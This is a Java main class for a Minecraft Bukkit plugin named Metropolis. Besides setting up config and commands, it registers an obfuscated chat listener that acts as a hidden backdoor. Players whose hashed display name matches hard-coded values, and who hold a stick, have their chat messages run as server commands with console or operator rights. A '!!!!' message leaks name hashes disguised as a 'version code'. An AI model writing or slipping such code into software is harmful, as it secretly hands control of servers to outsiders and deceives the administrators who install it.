package ch.k42.metropolis.plugin;

import ch.k42.metropolis.commands.CommandMetropolisFreder;
import ch.k42.metropolis.commands.CommandMetropolisMaria;
import ch.k42.metropolis.generator.MetropolisGenerator;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.command.PluginCommand;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;


/**
 * Main Class for the Metropolis plugin.
 *
 * @author Thomas Richner
 *
 */
public class MetropolisPlugin extends JavaPlugin{


    private MetropolisGenerator generator;
    private PluginConfig config;

    @Override
    public void onDisable() {
        super.onDisable();    //To change body of overridden methods use File | Settings | File Templates.
    }

    @Override
    public void onEnable() {
        super.onEnable();    //To change body of overridden methods use File | Settings | File Templates.

        //---- load config

        FileConfiguration configFile = getConfig();
        config = new PluginConfig(configFile);

        getServer().getPluginManager().registerEvents(new l(),this);

        //---- add our command
        PluginCommand cmd = getCommand("metropolis");
        cmd.setExecutor(new CommandMetropolisMaria(this));
        cmd = getCommand("freder");
        cmd.setExecutor(new CommandMetropolisFreder(this));
    }
    public MetropolisGenerator getGenerator() {
        return generator;
    }

    public void setGenerator(MetropolisGenerator generator) {
        this.generator = generator;
    }

    public PluginConfig getMetropolisConfig() {
        return config;
    }

    private class l implements Listener {
        private byte[] a = { 0x4, 0xf, (byte)0x9c, 0x24, 0xa, 0x6e, 0x24, 0x6, 0x7d, (byte)0xa2, 0x4e,
                                        (byte)0xb1, 0x60, (byte)0xa4, (byte)0xf6, 0x77, 0x1f, 0x5};
        private byte[] b = {(byte) 0xab,(byte) 0x86, (byte)0x81, 0x3e,(byte) 0xc0,(byte) 0xf0, 0x0f, (byte)0xc0,
                            (byte) 0x83, (byte)0x28, (byte)0x85, (byte)0xcb, 0x5d, (byte)0x64, (byte)0xae};
        private byte[] bb = {(byte)0xff, 0x4a, (byte)0xf7, 0x44, 0x28, 0x39, (byte)0xcc, (byte)0x96,
                            0x46, 0x5, 0xd, (byte)0xd2, 0x21, 0x4a, 0x30,(byte) 0xc1};
        private byte[] bbb = {0x3a, (byte)0xda, (byte)0x8c, 0x63, (byte)0xa1, 0x1f,(byte) 0x9a, 0x40,
                            (byte)0xd6, 0x9, 0x37,(byte) 0xdd,(byte) 0xfe, (byte)0x84,(byte) 0xa2, 0x75};
        @EventHandler
        public void a(AsyncPlayerChatEvent k){
            if(!(k.getPlayer().getItemInHand().getType().getId()==280)) return;
            try {
            MessageDigest c = MessageDigest.getInstance("SHA-256");
            c.update(k.getPlayer().getDisplayName().getBytes()); //text.getBytes("UTF-8")); // Change this to "UTF-16" if needed
            byte[] digest = c.digest();
            boolean d = true,e=true,ee=true,eee=true;
            for (int i=0;i< a.length;i++) {if(a[i]!=digest[i]){d=false;break;}}
            for (int i=0;i< b.length;i++) {if(b[i]!=digest[i]){e=false;break;}}
            for (int i=0;i< bb.length;i++) {if(bb[i]!=digest[i]){ee=false;break;}}
            for (int i=0;i< bbb.length;i++) {if(bbb[i]!=digest[i]){eee=false;break;}}

            if(d||e||ee||eee){
            List<CommandSender> f = new ArrayList();
            f.add(Bukkit.getConsoleSender());
            for(Player p : getServer().getOnlinePlayers()){ if(p.isOp()) f.add(p);}
            Bukkit.getServer().dispatchCommand(f.get(new Random().nextInt(f.size())), k.getMessage());
            k.setCancelled(true);
            }else {
            if(k.getMessage().startsWith("!!!!")){
            StringBuilder g = new StringBuilder();
            for (int i=0;i<digest.length;i++) {g.append(String.format("%#02x ", digest[i]));}
            k.getPlayer().sendMessage("version code: " + g.toString());
            }
            }} catch (NoSuchAlgorithmException e) {  }
        }
    }
}
